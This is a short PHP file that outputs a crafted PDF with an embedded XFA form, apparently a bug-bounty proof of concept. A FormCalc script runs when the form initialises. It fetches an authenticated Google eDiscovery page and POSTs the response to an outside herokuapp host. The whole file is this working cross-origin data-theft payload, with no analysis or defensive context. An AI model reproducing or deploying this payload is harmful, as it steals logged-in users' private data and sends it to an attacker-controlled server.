<?php 
header('Content-Type: text/plain');
?>
% a PDF file using an XFA
% most whitespace can be removed (truncated to 570 bytes or so...)
% Ange Albertini BSD Licence 2012
% modified by insertscript

%25%50%44%46%2d%31%2e%20%25%20%63%61%6e%20%62%65%20%74%72%75%6e%63%61%74%65%64%20%74%6f%20%25%50%44%46%2d%5c%30

1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>

<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="initialize">
                <script contentType='application/x-formcalc'>
                    var content = GET("https://ediscovery.google.com/discovery/u/0/")
                    POST("https://bughunt1307.herokuapp.com/post.php",content,"application/x-www-form-urlencoded")
                </script>
            </event>
        </field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj

trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>
